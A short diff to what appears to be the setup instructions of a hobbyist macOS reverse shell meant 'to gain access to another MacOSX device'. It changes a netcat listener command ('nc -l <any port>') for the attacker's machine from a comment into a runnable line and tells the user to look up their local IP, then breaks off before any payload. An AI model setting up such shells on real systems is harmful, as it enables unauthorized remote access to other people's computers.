@@ -1,7 +1,8 @@
 # This is, at heart, is a simple reverse shell to gain access to another MacOSX device. I'm looking into creating a tight shell that can run like a daemon but that is a wet dream atm.
 
 # FIRST STEP(s):
-# run "nc -l <any port>" on the attackers machine
+# run this on the attackers machine
+nc -l <any port>
 # This initialzes your computers listening protocol to look for TCP connections
 **IMPORTANT**
 # open another Terminal window and run "ipconfig getifaddr en0" to obtain your computers local ip (this is important for the next step)
